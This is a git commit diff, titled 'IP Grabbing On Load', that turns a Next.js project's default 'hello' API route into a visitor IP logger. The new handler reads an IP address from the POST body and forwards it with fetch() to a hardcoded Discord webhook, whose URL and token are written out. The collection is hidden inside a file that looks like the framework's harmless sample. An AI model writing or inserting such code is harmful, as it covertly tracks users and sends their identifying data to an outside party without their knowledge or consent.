69aeeb4eb549b73fbe10b947cc76039bdf8f3ff7
dignojrteogalbo <teogalbo.dj193@hotmail.com>
2022-04-02 02:23:38 -0600

    IP Grabbing On Load

--- pages/api/hello.ts
+++ pages/api/hello.ts
@@ -2,12 +2,28 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
 
 type Data = {
-  name: string
+  ip?: string,
+  message?: string,
+  name?: string
 }
 
+const discord: string = 'https://discord.com/api/webhooks/793705181316513793/0HqP78fT8nJWbnIENYBNpnOve6Ue95mo7ubcX-_LB8r6_dRuPP2_ZdmVhIqdaFXqCTxb'
+
 export default function handler(
-  req: NextApiRequest,
+  req: NextApiRequest, 
   res: NextApiResponse<Data>
 ) {
-  res.status(200).json({ name: 'John Doe' })
+  if (req.method !== 'POST') {
+    return res.status(405).send({ message: 'Only POST requests allowed!' })
+  }
+
+  const ip: string = req.body.ip
+  fetch(discord, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({ content: ip })
+  })
+  return res.status(204).end()
 }
